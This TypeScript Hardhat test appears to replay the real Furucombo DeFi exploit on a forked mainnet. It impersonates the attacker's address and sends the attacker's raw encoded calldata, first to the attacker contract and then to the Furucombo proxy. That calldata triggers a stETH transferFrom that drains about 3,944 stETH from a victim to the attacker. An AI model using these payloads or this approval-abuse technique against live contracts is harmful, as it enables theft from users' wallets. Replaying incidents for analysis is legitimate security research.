// import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { ethers, network } from 'hardhat';

import { IERC20 } from '../test-types';

// https://etherscan.io/address/0x86765dde9304bea32f65330d266155c4fa0c4f04
const ATTACKER_CONTRACT = '0x86765dde9304bEa32f65330d266155c4fA0C4F04';
const ATTACKER = '0xb624E2b10b84a41687caeC94BDd484E48d76B212';

const AAVE_CONTRACT = '';

// https://etherscan.io/address/0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f#code
const FURUCOMBO_CONTRACT = '0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f';

// https://etherscan.io/address/0xae7ab96520de3a18e5e111b5eaab095312d7fe84
const stETH_CONTRACT = '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84';

describe('Simulate Furucombo', () => {
	let attacker: SignerWithAddress;

	let stETHToken: IERC20;

	before(async () => {
		// Setup attacker
		await network.provider.request({
			method: 'hardhat_impersonateAccount',
			params: [ATTACKER],
		});
		attacker = await ethers.getSigner(ATTACKER);

		// const attackerContract = ethers.getContractAt();

		stETHToken = (await ethers.getContractAt('IERC20', stETH_CONTRACT)) as IERC20;
	});

	it('Exploit', async () => {
		const setupRecipt = await attacker.sendTransaction({
			to: ATTACKER_CONTRACT,
			data: '0x12487d640000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000086765dde9304bea32f65330d266155c4fa0c4f040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000030412487d640000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000017e8ca1b4798b97602895f63206afcd1fc90ca5f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c438c5c08e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000010000000000000000000000007d2768de32b0b80b7a3454c06bdac94a69ddc7a900000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000064d1f5789400000000000000000000000086765dde9304bea32f65330d266155c4fa0c4f0400000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
			gasLimit: '30000000',
		});

		// console.log('tx', setupRecipt);

		await expect(
			attacker.sendTransaction({
				to: FURUCOMBO_CONTRACT,
				data: '0x38c5c08e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000010000000000000000000000007d2768de32b0b80b7a3454c06bdac94a69ddc7a9000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001a412487d640000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000ae7ab96520de3a18e5e111b5eaab095312d7fe840000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd00000000000000000000000078bc49be7bae5e0eec08780c86f0e8278b8b035b000000000000000000000000b624e2b10b84a41687caec94bdd484e48d76b2120000000000000000000000000000000000000000000000d5cd783ab299c27c880000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
				gasLimit: '30000000',
			}),
		).to.changeTokenBalance(stETHToken, attacker.address, BigNumber.from('3943962136013873249415'));
	});

	after(async () => {
		expect(attacker.address).to.equal(ATTACKER);
	});
});
